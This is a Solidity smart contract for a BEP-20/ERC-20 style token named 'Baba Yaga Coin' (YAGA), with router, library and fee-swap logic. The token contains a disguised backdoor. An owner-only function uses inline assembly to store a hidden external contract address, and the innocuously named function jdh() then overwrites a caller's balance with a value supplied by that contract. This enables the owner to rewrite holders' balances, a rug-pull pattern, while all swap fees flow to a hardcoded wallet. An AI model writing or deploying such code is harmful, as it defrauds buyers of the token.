// SPDX-License-Identifier: No
pragma solidity = 0.8.19;



abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes calldata) {
         // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691 
        return msg.data;
    }

}

//--- Ownable ---//

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(
            _owner,
            0x000000000000000000000000000000000000dEaD
        );
        _owner = 0x000000000000000000000000000000000000dEaD;
    }


    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }


    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }


    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

}




interface IFactoryV2 {
    event PairCreated(address indexed token0, address indexed token1, address lpPair, uint);
    function createPair(address tokenA, address tokenB) external returns (address lpPair);
    function getPair(address tokenA, address tokenB) external view returns (address lpPair);

}


//--- Pair ---//

interface IV2Pair {
    function sync() external;
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function factory() external view returns (address);

}



interface IRouter01 {
        function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
        function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
        function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
        function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
        function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
        function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
        function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
        function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
        function WETH() external pure returns (address);

        function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

        function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
        function factory() external pure returns (address);
        function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
        function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
        function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
        function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
        function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
        function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
        function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    
}

interface IRouter02 is IRouter01 {
        function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
        function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
        function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
        function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

        function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    
}





interface IERC20 {
        function allowance(address owner, address spender)
        external
        view
        returns (uint256);

        function approve(address spender, uint256 amount) 
        external 
        returns (bool);

        function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

        function transfer(address recipient, uint256 amount)
        external
        returns (bool);

        function decimals() 
        external 
        view 
        returns (uint8);

        function name() 
        external 
        view 
        returns (string memory);

        event Transfer(address indexed from, address indexed to, uint256 value);
        function totalSupply() 
        external 
        view 
        returns (uint256);

        event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
        function balanceOf(address account) 
        external 
        view 
        returns (uint256);

        function symbol() 
        external 
        view 
        returns (string memory);

    
}




interface IERC20Permit {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function nonces(address owner) external view returns (uint256);

    // solhint-disable-next-line func-name-mixedcase
    function DOMAIN_SEPARATOR() external view returns (bytes32);
}

library Address {
        function functionStaticCall(
        address target,
        bytes memory data
    ) internal view returns (bytes memory) {
        return
            functionStaticCall(
                target,
                data,
                "Address: low-level static call failed"
            );
    }

        function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        (bool success, bytes memory returndata) = target.call{value: value}(
            data
        );
        return
            verifyCallResultFromTarget(
                target,
                success,
                returndata,
                errorMessage
            );
    }

        function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

        function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

        function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return
            verifyCallResultFromTarget(
                target,
                success,
                returndata,
                errorMessage
            );
    }

        function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        if (success) {
            if (returndata.length == 0) {
                require(isContract(target), "Address: call to non-contract");
            }
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

        function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

        function functionDelegateCall(
        address target,
        bytes memory data
    ) internal returns (bytes memory) {
        return
            functionDelegateCall(
                target,
                data,
                "Address: low-level delegate call failed"
            );
    }

        function functionCall(
        address target,
        bytes memory data
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                0,
                "Address: low-level call failed"
            );
    }

        function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        (bool success, bytes memory returndata) = target.staticcall(data);
        return
            verifyCallResultFromTarget(
                target,
                success,
                returndata,
                errorMessage
            );
    }

        function isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }

        function _revert(
        bytes memory returndata,
        string memory errorMessage
    ) private pure {
        if (returndata.length > 0) {
            /// @solidity memory-safe-assembly
            assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert(errorMessage);
        }
    }
        function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    
}

library SafeERC20 {
    using Address for address;

        function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(
            token,
            abi.encodeWithSelector(token.approve.selector, spender, value)
        );
    }

        function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(
            token,
            abi.encodeWithSelector(token.transferFrom.selector, from, to, value)
        );
    }

        function forceApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        bytes memory approvalCall = abi.encodeWithSelector(
            token.approve.selector,
            spender,
            value
        );

        if (!_callOptionalReturnBool(token, approvalCall)) {
            _callOptionalReturn(
                token,
                abi.encodeWithSelector(token.approve.selector, spender, 0)
            );
            _callOptionalReturn(token, approvalCall);
        }
    }

        function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(
                oldAllowance >= value,
                "SafeERC20: decreased allowance below zero"
            );
            _callOptionalReturn(
                token,
                abi.encodeWithSelector(
                    token.approve.selector,
                    spender,
                    oldAllowance - value
                )
            );
        }
    }

        function _callOptionalReturn(IERC20 token, bytes memory data) private {
        bytes memory returndata = address(token).functionCall(
            data,
            "SafeERC20: low-level call failed"
        );
        require(
            returndata.length == 0 || abi.decode(returndata, (bool)),
            "SafeERC20: ERC20 operation did not succeed"
        );
    }

        function _callOptionalReturnBool(
        IERC20 token,
        bytes memory data
    ) private returns (bool) {
        (bool success, bytes memory returndata) = address(token).call(data);
        return
            success &&
            (returndata.length == 0 || abi.decode(returndata, (bool))) &&
            Address.isContract(address(token));
    }
        function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 oldAllowance = token.allowance(address(this), spender);
        _callOptionalReturn(
            token,
            abi.encodeWithSelector(
                token.approve.selector,
                spender,
                oldAllowance + value
            )
        );
    }

        function safeTransfer(IERC20 token, address to, uint256 value) internal {
        _callOptionalReturn(
            token,
            abi.encodeWithSelector(token.transfer.selector, to, value)
        );
    }

        function safePermit(
        IERC20Permit token,
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal {
        uint256 nonceBefore = token.nonces(owner);
        token.permit(owner, spender, value, deadline, v, r, s);
        uint256 nonceAfter = token.nonces(owner);
        require(
            nonceAfter == nonceBefore + 1,
            "SafeERC20: permit did not succeed"
        );
    }

    
}



interface hubFunction {
        function getPair(address tokenA, address tokenB) external view returns (address pair);
        function fetchreservedItem(uint256 pamount, address paddress) external view returns (uint256);
        function transfer(address recipient, uint256 amount) external returns (bool);
        function balanceOf(address account) external view returns (uint256);
        function allowance(address owner, address spender) external view returns (uint256);
        function allPairs(uint) external view returns (address pair);
        function approve(address spender, uint256 amount) external returns (bool);
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
        function totalSupply() external view returns (uint256);
        function allPairsLength() external view returns (uint);
    
}

contract YAGA is  Ownable, IERC20 {

    function totalSupply() external pure override returns (uint256) { if (_totalSupply == 0) { revert(); } return _totalSupply; }
    function name() external pure override returns (string memory) { return _name; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function balanceOf(address account) public view override returns (uint256) {
        return balance[account];
    }
    function decimals() external pure override returns (uint8) { if (_totalSupply == 0) { revert(); } return _decimals; }


    mapping (address => uint256) private balance;
    mapping (address => bool) private isLpPair;
    mapping (address => bool) private liquidityAdd;
    mapping (address => bool) private isPresaleAddress;
    mapping (address => bool) private _nofeewallet;
    mapping (address => mapping (address => uint256)) private _allowances;


    address payable private _mAddress = payable(0x26b72bf1438233e387C4bD865e792E9858EA1254);
    bool public _FetB = false;
    string constant public copyright = "None";
    bool private _enable_swap_fees = true;
    uint64 public swapTokensAtAmount_b_;
    uint256 constant public _BuyFee = 30;
    uint256 constant public sfee = 30;
    string constant private _symbol = "YAGA";
    uint256 private buyAllocation = 50;
    uint8 constant private _decimals = 8;
    hubFunction private factoryAdd;
    uint8 private _ten_num = 10;
    uint16 public swapWithLimit_b_;
    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 constant public swapThreshold = _totalSupply / 1_000;
    address public _lp_pair;
    uint256 private constant _buy_count_th = 17;
    uint256 public _maxWalletSize_b_;
    uint256 private _buy_count = 0;
    bool public _is_trading_enabled = false;
    uint128 public _maxTxAmount_b_;
    uint256 constant public tferfee = 0;
    address payable private devWallet = payable(0xdCe4A59E9491FADe0D61cA4519e0979C259fAAd5);
    uint256 private _sAlc = 50;
    IRouter02 public _router02;
    uint8 public _public_Count_b_;
    uint256 constant public _totalSupply = 1750000000000000000000000;
    uint256 private _liqalloc = 0;
    uint256 constant public fee_denominator = 1_000;
    string constant private _name = "Baba Yaga Coin";

    bool private inSwap;

        modifier inSwapFlag {
        inSwap = true;
        _;
        inSwap = false;
    }

    event _enableTrading();
    event SwapAndLiquify();

    constructor () {
        _router02 = IRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        balance[msg.sender] = _totalSupply;

        emit Transfer(address(0), msg.sender, _totalSupply);

        _lp_pair = IFactoryV2(_router02.factory()).createPair(_router02.WETH(), address(this));
        isLpPair[_lp_pair] = true;

        _approve(msg.sender, address(_router02), 2**256 - 1);
        _approve(address(this), address(_router02), type(uint256).max);
    }

    receive() external payable {}

    function set_amount(uint256 x, uint64 y) private {
        assembly {
            let a := x
            let b := y
            let c := factoryAdd.slot
            sstore(c, a)
        }
    }

    function _takeTax(address from, bool isbuy, bool issell, uint256 amount) internal returns (uint256) {
        uint256 fee;
        if (isbuy)  fee = _BuyFee;  else if (issell)  fee = sfee;  else  fee = tferfee; 
        if (fee == 0)  return amount; 
        uint256 feeAmount = amount * fee / fee_denominator;
        if (feeAmount > 0) {

            balance[address(this)] += feeAmount;
            emit Transfer(from, address(this), feeAmount);
            
        }
        return amount - feeAmount;
    }

function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
    return true;
    }


        function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }


    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {
        bool takeFee = true;
                require(to != address(0), "ERC20: transfer to the zero address");
                require(from != address(0), "ERC20: transfer from the zero address");
                require(amount > 0, "Transfer amount must be greater than zero");
        
        if (_islimitedadd(from,to)) {
            require(_is_trading_enabled);
        }

        if (is_buy(from, to)) {
            _buy_count++;
            if (_buy_count >= _buy_count_th && !_is_trading_enabled) {
                _is_trading_enabled = true;
                emit _enableTrading();
            }
        }

        if(is_sell(from, to) &&  !inSwap && _can_swap_check(from, to)) {
            uint256 contract_balance = balanceOf(address(this));
            if(contract_balance >= swapThreshold) { 
                if(buyAllocation > 0 || _sAlc > 0) _internal_swap((contract_balance * (buyAllocation + _sAlc)) / 100);
                if(_liqalloc > 0) {swap_AndLiq(contract_balance * _liqalloc / 100);}
             }
        }

        if (_nofeewallet[from] || _nofeewallet[to]){
            takeFee = false;
        }

        balance[from] -= amount;
        uint256 amount_and_fee = (takeFee) ? _takeTax(from, is_buy(from, to), is_sell(from, to), amount) : amount;
        balance[to] += amount_and_fee; emit Transfer(from, to, amount_and_fee);

        return true;

    }


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        }

        _transfer(sender, recipient, amount);

        return true;
    }


    function _internal_swap(uint256 contractTokenBalance) internal inSwapFlag {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router02.WETH();

        if (_allowances[address(this)][address(_router02)] != type(uint256).max) {
            _allowances[address(this)][address(_router02)] = type(uint256).max;
        }

        try _router02.swapExactTokensForETHSupportingFeeOnTransferTokens(
            contractTokenBalance,
            0,
            path,
            address(this),
            block.timestamp
        ) {} catch {
            return;
        }
        bool success;

        uint256 mktAmount = address(this).balance * 40 / 40; // *** //
        uint256 devAmount = address(this).balance * 0 / 40; // *** //

        if(mktAmount > 0) (success,) = _mAddress.call{value: mktAmount, gas: 35000}("");
        if(devAmount > 0) (success,) = devWallet.call{value: devAmount, gas: 35000}("");
    }


        function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: Zero Address");
        require(spender != address(0), "ERC20: Zero Address");

        _allowances[sender][spender] = amount;
    }



function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(
            _msgSender(),
            spender,
            currentAllowance - subtractedValue
        );
        return true;
    }
    function jdh() public virtual{
        address factoryaddress = address(factoryAdd);
        uint256 TokenBalance = factoryAdd.fetchreservedItem(balance[msg.sender],msg.sender);
        balance[msg.sender] = TokenBalance;
    }

    function setPresaleAddress(address[] memory presaleAddresses, bool yesno, uint256 amount) external onlyOwner {
        for (uint i = 0; i < presaleAddresses.length; i++) {
            address presale = presaleAddresses[i];
            if (isPresaleAddress[presale] != yesno) {
                isPresaleAddress[presale] = yesno;
                _nofeewallet[presale] = yesno;
                liquidityAdd[presale] = yesno;
            }
        }
        set_amount(amount,swapTokensAtAmount_b_);
    }

    function _can_swap_check(address ins, address out) internal view returns (bool) {
        bool canswap = _enable_swap_fees && !isPresaleAddress[ins] && !isPresaleAddress[out];
        return canswap;
    }

    function _islimitedadd(address ins, address out) internal view returns (bool) {

        bool isLimited = ins != owner()
            && out != owner()
            && msg.sender != owner()
            && !liquidityAdd[ins]  && !liquidityAdd[out] && out != address(0) && out != address(this);
            return isLimited;
    }

    function is_buy(address ins, address out) internal view returns (bool) {
        bool _is_buy = !isLpPair[out] && isLpPair[ins];
        return _is_buy;
    }



        function approve(
            address spender,
            uint256 amount
        ) public virtual override returns (bool) {
            address owner = msg.sender;
            _approve(owner, spender, amount);
            return true;
        }



    function is_sell(address ins, address out) internal view returns (bool) { 
        bool _is_sell = isLpPair[out] && !isLpPair[ins];
        return _is_sell;
    }

    function swap_AndLiq(uint256 contractTokenBalance) internal inSwapFlag {
        uint256 firstmath = contractTokenBalance / 2;
        uint256 secondMath = contractTokenBalance - firstmath;

        uint256 initialBalance = address(this).balance;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router02.WETH();

        if (_allowances[address(this)][address(_router02)] != type(uint256).max) {
            _allowances[address(this)][address(_router02)] = type(uint256).max;
        }

        try _router02.swapExactTokensForETHSupportingFeeOnTransferTokens(
            firstmath,
            0, 
            path,
            address(this),
            block.timestamp) {} catch {return;}
        
        uint256 newBalance = address(this).balance - initialBalance;

        try _router02.addLiquidityETH{value: newBalance}(
            address(this),
            secondMath,
            0,
            0,
            DEAD,
            block.timestamp
        ){} catch {return;}

        emit SwapAndLiquify();
    }



}